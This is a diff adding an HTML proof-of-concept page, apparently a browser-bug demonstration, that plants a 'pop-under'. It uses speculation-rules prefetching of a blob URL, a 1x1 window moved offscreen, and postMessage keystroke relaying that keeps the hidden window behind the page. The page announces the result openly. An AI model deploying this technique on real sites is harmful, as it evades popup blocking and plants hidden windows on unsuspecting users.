@@ -1,0 +1,62 @@
+<title>Pop-under</title>
+<h1>Pop-under</h1>
+<p>Please type "hello" below to continue...</p>
+<input type="text" id="hello" placeholder="hello" autofocus />
+<script>
+  name = "main";
+
+  const blob = new Blob(
+    [
+      `
+<script>
+  onkeydown = (e) => {
+    opener.postMessage({ key: e.key }, "*");
+    open(opener.location + "#", "main");
+    location = "https://example.com"
+  };
+<\/script>
+    `,
+    ],
+    { type: "text/html" }
+  );
+  const url = URL.createObjectURL(blob);
+
+  const specScript = document.createElement("script");
+  specScript.type = "speculationrules";
+  const specRules = {
+    prefetch: [
+      {
+        source: "list",
+        urls: [url],
+      },
+    ],
+  };
+  specScript.textContent = JSON.stringify(specRules);
+  document.body.append(specScript);
+
+  onkeydown = () => {
+    // Trigger at double "l"
+    if (event.key === "l") {
+      w = open(url, "popup", "width=1,height=1");
+      w.moveTo(9999, 0);
+      onkeydown = null;
+    }
+  };
+
+  onmessage = (e) => {
+    if (e.data.key.length === 1) {
+      document.getElementById("hello").value += e.data.key;
+    }
+  };
+
+  onhashchange = () => {
+    history.replaceState("", "", location.href.split("#")[0]);
+  };
+
+  checker = setInterval(() => {
+    if (document.getElementById("hello").value === "hello") {
+      clearInterval(checker);
+      alert("Congrats! You now have a pop-under :)");
+    }
+  }, 1000);
+</script>
